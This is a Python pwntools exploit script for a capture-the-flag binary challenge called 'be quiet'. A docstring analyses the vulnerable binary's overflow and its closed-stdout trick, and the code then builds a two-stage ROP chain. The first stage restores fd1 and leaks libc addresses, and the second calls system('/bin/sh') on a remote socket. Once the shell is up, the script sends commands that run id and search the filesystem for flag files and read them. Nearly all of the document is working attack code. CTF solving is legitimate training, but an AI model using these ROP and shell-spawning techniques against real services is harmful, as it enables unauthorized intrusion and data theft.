#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""CTF+ 2026 challenge 19 "保持沉默" (be quiet)  --  exploit / solver.

BINARY FACTS (no PIE, no canary, NX on, Partial RELRO, SHSTK/IBT ELF-flags only)
==============================================================================
  put(a, b)        0x40126a   if (a == 0xdeadbeef && b == 0x9527)
                                 dup2(2, 1); puts("[+] Congratulation! ...")
                              else
                                 dup2(2, 1); printf("You don't know the rop! ..."); exit(0)
  vuln()           0x4012ec   printf("Input your payload: \n")
                              if (flag != 0) { close(1); flag--; }   // 'flag' @0x404080 == 1
                              read(0, rbp-0x20, 0x100)               // <-- overflow
  main()           0x401352   init(); printf(wel); vuln()
  gadget           0x4011fe   pop rdi ; ret        (+0x0a -> 0x401200: pop rsi ; ret)
  _dl_relocate_static_pie 0x401144  ret            (alignment sled)

WHY "SILENCE"
=============
`flag` starts at 1, so the FIRST vuln() executes close(1).  Every leak-ROP you
fire goes to a closed fd1 -> the terminal is dead.  The "pair of keys" in memory
is the literal pair put() compares: 0xdeadbeef and 0x9527.  Presenting them calls
dup2(2, 1), i.e. fd1 := fd2.  Under inetd/xinetd (and socat ... ,stderr) fd2 is
the same socket, so stdout is plugged back in -- the "dup2 lifeline".

EXPLOIT SHAPE
=============
  stage 1 (single 168-byte read):
      put(0xdeadbeef, 0x9527)  -> fd1 alive again
      puts(puts@got)           -> libc leak #1
      puts(read@got)           -> libc leak #2  (cross-check / libc id)
      main()                   -> whole flow restarts; flag == 0 now, so the
                                  second vuln() does NOT close fd1 again
  stage 2:  pop rdi; "/bin/sh"; ret; system  -> shell on the socket

The keys are leaked from the disassembly of put(), not from memory at runtime;
`--restore fd0` is an equivalent fallback that skips the key gate and calls
dup2@plt(0, 1) directly, which also works when fd2 is *not* the socket.

USAGE
=====
  python3 19-solve.py --host <addr> --port 80        # remote (auto libc id)
  python3 19-solve.py --libc /path/to/libc.so.6      # local == remote libc
  python3 19-solve.py                                # local, for regression
"""
import argparse
import json
import os
import shutil
import sys
import time
import urllib.request

from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# ------------------------------------------------------------------ constants
POP_RDI  = 0x4011fe          # gadget+0x08 : pop rdi ; ret
POP_RSI  = 0x401200          # gadget+0x0e : pop rsi ; ret
RET      = 0x401144          # _dl_relocate_static_pie : ret
PUT      = 0x40126a          # key-gated dup2(2,1)
VULN     = 0x4012ec
MAIN     = 0x401352
PUTS_PLT = 0x4010a0
DUP2_PLT = 0x4010b0
PUTS_GOT = 0x404018
READ_GOT = 0x404038

KEY1 = 0xdeadbeef            # the "pair of keys" (rsi/rdi order in put())
KEY2 = 0x9527

OFF      = 40                # rbp-0x20 buffer (32) + saved rbp (8)
PROMPT   = b'Input your payload: \n'   # msg @0x404090, includes the newline
UNLOCK   = b'The rights have been unlocked!\n'

# ------------------------------------------------------------------ libc table
# Verified against libc.rip + the real .so (all 2.35-0ubuntu3.x revisions share
# these offsets).  Anything else is resolved online by querying libc.rip with the
# two leaks; if that is unreachable the leaks are printed for manual lookup.
#         name                                     puts      read      system    /bin/sh
LIBC_TABLE = [
    ('libc6_2.35-0ubuntu3.x_amd64 (Ubuntu 22.04)', 0x80e50, 0x1147d0, 0x50d70, 0x1d8678),
]

FLAG_CMD = (b'echo __PWNED__; id; pwd; '
            b'cat /home/ctf/flag 2>/dev/null; '                 # known-good path
            b'ls -la /home/* /home/ctf 2>/dev/null; '
            b'cat flag flag.txt /flag /flag.txt 2>/dev/null; '
            b'find / -maxdepth 3 -iname "*flag*" -not -path "/proc/*" 2>/dev/null | head -20')


# ------------------------------------------------------------------ ROP build
def build_stage1(restore):
    p = b'A' * OFF
    if restore == 'key':
        p += p64(POP_RDI) + p64(KEY1)
        p += p64(POP_RSI) + p64(KEY2)
    else:                                   # 'fd0' fallback, no key gate
        p += p64(POP_RDI) + p64(0)
        p += p64(POP_RSI) + p64(1)
    p += p64(RET)
    p += p64(PUT if restore == 'key' else DUP2_PLT)
    p += p64(POP_RDI) + p64(PUTS_GOT) + p64(RET) + p64(PUTS_PLT)    # leak 1
    p += p64(POP_RDI) + p64(READ_GOT) + p64(RET) + p64(PUTS_PLT)    # leak 2
    p += p64(RET) + p64(MAIN)                                       # restart
    return p


def build_stage2(system, binsh):
    return b'A' * OFF + p64(POP_RDI) + p64(binsh) + p64(RET) + p64(system)


# ------------------------------------------------------------------ libc id
def identify(puts_leak, read_leak, libc_path=None):
    if libc_path:
        libc = ELF(libc_path, checksec=False)
        return (os.path.basename(libc_path), puts_leak - libc.symbols['puts'],
                libc.symbols['system'], next(libc.search(b'/bin/sh')))

    for name, po, ro, so, bo in LIBC_TABLE:
        base = puts_leak - po
        if base & 0xfff == 0 and read_leak - ro == base:
            return (name, base, so, bo)

    # online: ask libc.rip with both leaks
    try:
        req = urllib.request.Request(
            'https://libc.rip/api/find',
            data=json.dumps({'symbols': {'puts': hex(puts_leak),
                                         'read': hex(read_leak)}}).encode(),
            headers={'Content-Type': 'application/json'})
        with urllib.request.urlopen(req, timeout=25) as r:
            cands = json.load(r)
    except Exception as exc:                                    # noqa: BLE001
        log.warning('libc.rip unreachable (%s)' % exc)
        cands = []

    for c in cands:
        try:
            po = int(c['symbols']['puts'], 16)
            ro = int(c['symbols']['read'], 16)
            so = int(c['symbols']['system'], 16)
            bo = int(c['symbols']['str_bin_sh'], 16)
        except (KeyError, ValueError):
            continue
        base = puts_leak - po
        if base & 0xfff == 0 and read_leak - ro == base:
            log.success('libc.rip identified: %s' % c['id'])
            return (c['id'], base, so, bo)

    raise SystemExit(
        '[-] could not identify libc.\n'
        '    puts leak = %#x (low12 %#x)\n'
        '    read leak = %#x (low12 %#x)\n'
        '    -> look these up (libc.rip / libc.blukat.me), re-run with --libc'
        % (puts_leak, puts_leak & 0xfff, read_leak, read_leak & 0xfff))


# ------------------------------------------------------------------ exploit
def expect(io, tok, timeout=10, what=''):
    """recvuntil that always fails loudly: this pwntools returns partial data
    (instead of raising) when the timeout expires."""
    data = io.recvuntil(tok, timeout=timeout)
    if not data.endswith(tok):
        raise EOFError('sync failed waiting for %r%s; got %r'
                       % (tok, (' (%s)' % what) if what else '', data[-120:]))
    return data


def recvn_exact(io, n, timeout=10, what=''):
    data = io.recvn(n, timeout=timeout)
    if len(data) != n:
        raise EOFError('short read for %s: got %r' % (what or '%d bytes' % n, data))
    return data


def exploit(io, restore, libc_path=None):
    # ---------- stage 1 ----------
    expect(io, PROMPT, what='stage-1 prompt')
    io.send(build_stage1(restore))

    if restore == 'key':
        # this marker only exists on put()'s success path; its absence is how we
        # detect that fd2 is not the socket and switch to the direct dup2(0,1)
        expect(io, UNLOCK, timeout=8, what='put() success marker')
        log.success('keys accepted -> put() ran dup2(2,1); fd1 is alive again')

    # puts() emits exactly 6 bytes of address + '\n' (fixed read: the raw bytes
    # may legitimately contain 0x0a, so never split on newline)
    raw = recvn_exact(io, 7, what='puts leak')
    assert raw.endswith(b'\n'), raw
    puts_leak = u64(raw[:6].ljust(8, b'\x00'))
    raw = recvn_exact(io, 7, what='read leak')
    assert raw.endswith(b'\n'), raw
    read_leak = u64(raw[:6].ljust(8, b'\x00'))
    log.success('puts leak = %#x   read leak = %#x' % (puts_leak, read_leak))

    expect(io, b'Hello hacker!', what='main() restart')

    name, base, system, binsh = identify(puts_leak, read_leak, libc_path)
    log.success('libc = %s' % name)
    log.success('base = %#x  system = %#x  /bin/sh = %#x'
                % (base, base + system, base + binsh))

    # ---------- stage 2 ----------
    expect(io, PROMPT, what='stage-2 prompt')
    # flag counter is 0 now, so this vuln() leaves fd1 alone
    io.send(build_stage2(base + system, base + binsh))
    time.sleep(0.5)
    io.sendline(FLAG_CMD)
    head = expect(io, b'__PWNED__', timeout=10, what='shell marker')
    out = head + io.recvrepeat(3)
    sys.stdout.buffer.write(out)
    sys.stdout.flush()
    return out


def connect(args):
    if args.host:
        return remote(args.host, args.port, timeout=10)
    path = local_binary(args.target)
    if not os.access(path, os.X_OK):
        os.chmod(path, 0o755)
    # stderr=STDOUT models a socket shared by fd1 and fd2
    return process(path, stderr=STDOUT)


_HERE = os.path.dirname(os.path.abspath(__file__))
FW_BIN = os.path.join(_HERE, '..', 'firmware', '19_保持沉默', 'pwn')
WORK_BIN = os.path.join(_HERE, '..', 'work', '19_quiet', 'pwn')


def local_binary(target=None):
    """Never run/chmod the read-only firmware attachment: use a working copy."""
    if target:
        return target
    if not os.path.exists(WORK_BIN):
        os.makedirs(os.path.dirname(WORK_BIN), exist_ok=True)
        shutil.copyfile(FW_BIN, WORK_BIN)
    return WORK_BIN


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--host')
    ap.add_argument('--port', type=int, default=80)
    ap.add_argument('--target', help='local binary (defaults to a work/ copy)')
    ap.add_argument('--libc', help='exact remote libc.so.6 (skips identification)')
    ap.add_argument('--restore', default='auto', choices=['auto', 'key', 'fd0'])
    ap.add_argument('--interactive', action='store_true')
    args = ap.parse_args()

    order = ['key', 'fd0'] if args.restore == 'auto' else [args.restore]

    for i, restore in enumerate(order):
        io = connect(args)
        log.info('--- attempt: restore=%s ---' % restore)
        try:
            exploit(io, restore, args.libc)
            if args.interactive:
                io.interactive()
            return 0
        except Exception as exc:                            # noqa: BLE001
            log.failure('restore=%s failed: %r' % (restore, exc))
            try:
                io.close()
            except Exception:                               # noqa: BLE001
                pass
            if i == len(order) - 1:
                raise
            log.info('retrying with the other fd1-restore strategy')
    return 1


if __name__ == '__main__':
    sys.exit(main())
